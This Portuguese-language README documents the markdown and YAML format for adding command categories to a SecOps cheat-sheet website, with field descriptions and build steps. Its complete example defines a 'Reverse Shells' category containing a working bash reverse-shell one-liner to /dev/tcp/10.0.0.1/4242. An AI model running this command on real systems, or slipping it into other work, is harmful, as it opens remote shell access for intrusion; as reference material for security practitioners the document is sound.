# CheatSheet Content Collections

Este diretório contém os comandos de SecOps organizados por categorias.

## Adicionando uma nova categoria

Crie um novo arquivo markdown (`.md`) no formato:

```markdown
---
title: "Category Name"
id: "category-slug"
icon: "material-symbols:icon-name"
---

```yaml
commands:
  - cmd: "seu comando aqui"
    desc: "Descrição do comando"
    difficulty: "Easy"  # Easy, Medium, Hard
    tags: ["tag1", "tag2", "tag3"]
```

## Campos disponíveis

- `title`: Nome da categoria (usado nos filtros)
- `id`: ID único da categoria (slug)
- `icon`: Ícone do Material Symbols
- `commands`: Array de comandos

### Command Object

- `cmd`: O comando exato
- `desc`: Descrição do que o comando faz
- `difficulty`: 'Easy', 'Medium', ou 'Hard'
- `tags`: Array de strings para filtros

## Exemplo completo

```markdown
---
title: "Reverse Shells"
id: "shells"
icon: "material-symbols:terminal-rounded"
---

```yaml
commands:
  - cmd: "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"
    desc: "Bash TCP Reverse Shell"
    difficulty: "Easy"
    tags: ["linux", "bash", "network"]
```
```

## Depois de adicionar

1. Edite `src/pages/cheatsheet.astro` - não é necessário, ele carrega automaticamente
2. Teste localmente: `pnpm dev`
3. Verifique no site: `http://localhost:4321/cheatsheet/`

## Nota

Os comandos são renderizados estáticamente no build. Atualize páginas existentes para refletir as alterações re-executando `pnpm build`.
